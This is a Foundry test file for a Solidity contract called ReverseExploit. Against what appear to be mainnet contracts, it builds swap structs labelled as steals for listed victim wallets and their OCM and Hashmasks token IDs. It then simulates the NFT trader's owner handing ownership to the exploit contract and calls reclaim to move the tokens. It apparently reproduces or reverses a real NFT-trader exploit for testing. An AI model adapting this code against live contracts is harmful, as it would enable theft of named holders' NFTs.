// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {IERC721} from "forge-std/interfaces/IERC721.sol";
import {ReverseExploit, INFTTrader, swapStruct, swapIntent, swapStatus} from "../src/ReverseExploit.sol";

contract ReverseExploitTest is Test {
    ReverseExploit public _exploit;

    address _quit = 0xC218D847a18E521Ae08F49F7c43882b6d1963c60;

    swapStruct[] _nftsOne;
    swapStruct[] _nftsTwo;
    uint256[] private blc;

    uint256[] ocmTokenIds;
    uint256[] hashMaskTokenIds;
    uint256[] feudalzTokenIds;
    uint256[] tokenIds;
    uint256[] allTokenIds;
    address[] victims;

    swapStruct[] structs;

    uint256 _swapId;

    function setUp() public {
        vm.prank(_quit);
        _exploit = new ReverseExploit();

        _swapId = uint256(vm.load(0xC310e760778ECBca4C65B6C559874757A4c4Ece0, 0x0000000000000000000000000000000000000000000000000000000000000008));
    }

    function testExploit() public {
        ocmTokenIds.push(2817);
        victims.push(0xaEDa87F3F3d68337Ed3cf32D98DBbc94c380eBBC);
        ocmTokenIds.push(9408);
        victims.push(0x99E82A0cdDD0bcb13274c30398024130B1D1A43A);
        ocmTokenIds.push(7331);
        victims.push(0x91d732C0d0a95760a4B5Fb2dfCBaDfB4Cd17E26F);
        ocmTokenIds.push(2401);
        victims.push(0x91d732C0d0a95760a4B5Fb2dfCBaDfB4Cd17E26F);
        ocmTokenIds.push(8552);
        victims.push(0x91d732C0d0a95760a4B5Fb2dfCBaDfB4Cd17E26F);

        tokenIds.push(0);
        for (uint256 i = 0; i < ocmTokenIds.length; i++) {
            tokenIds[0] = ocmTokenIds[i];
            allTokenIds.push(tokenIds[0]);
            swapStruct memory _stealSwap = swapStruct(
                0x960b7a6BCD451c9968473f7bbFd9Be826EFd549A,
                0x58874d2951524F7f851bbBE240f0C3cF0b992d79,
                tokenIds,
                blc,
                new bytes(0)
            );

            structs.push(_stealSwap);
        }

        hashMaskTokenIds.push(12525);
        victims.push(0xCe53dCF94e9DadC8eB56B67E581E8003138460BD);
        hashMaskTokenIds.push(2215);
        victims.push(0xCe53dCF94e9DadC8eB56B67E581E8003138460BD);
        hashMaskTokenIds.push(13342);
        victims.push(0xCe53dCF94e9DadC8eB56B67E581E8003138460BD);
        hashMaskTokenIds.push(5887);
        victims.push(0xCe53dCF94e9DadC8eB56B67E581E8003138460BD);
        hashMaskTokenIds.push(14851);
        victims.push(0xCe53dCF94e9DadC8eB56B67E581E8003138460BD);
        hashMaskTokenIds.push(6249);
        victims.push(0xCe53dCF94e9DadC8eB56B67E581E8003138460BD);
        hashMaskTokenIds.push(77);
        victims.push(0xCe53dCF94e9DadC8eB56B67E581E8003138460BD);
        hashMaskTokenIds.push(3346);
        victims.push(0x14F1Bd275827538775558C01b1C075bCCC1916Ca);
        hashMaskTokenIds.push(8167);
        victims.push(0x14F1Bd275827538775558C01b1C075bCCC1916Ca);
        hashMaskTokenIds.push(13927);
        victims.push(0x14F1Bd275827538775558C01b1C075bCCC1916Ca);
        hashMaskTokenIds.push(13280);
        victims.push(0x14F1Bd275827538775558C01b1C075bCCC1916Ca);

        for (uint256 i = 0; i < hashMaskTokenIds.length; i++) {
            tokenIds[0] = hashMaskTokenIds[i];
            allTokenIds.push(tokenIds[0]);
            swapStruct memory _stealSwap = swapStruct(
                0xC2C747E0F7004F9E8817Db2ca4997657a7746928,
                0x58874d2951524F7f851bbBE240f0C3cF0b992d79,
                tokenIds,
                blc,
                new bytes(0)
            );

            structs.push(_stealSwap);
        }

        vm.prank(INFTTrader(0xC310e760778ECBca4C65B6C559874757A4c4Ece0).owner());

        INFTTrader(0xC310e760778ECBca4C65B6C559874757A4c4Ece0).transferOwnership(address(_exploit));

        vm.prank(_quit);
        _exploit.reclaim{value: 0.01 ether * structs.length}(structs, _swapId, 0x000000000000C35e4364DEFfA9059DbAdAeFd4F8, victims, allTokenIds);
    }
}
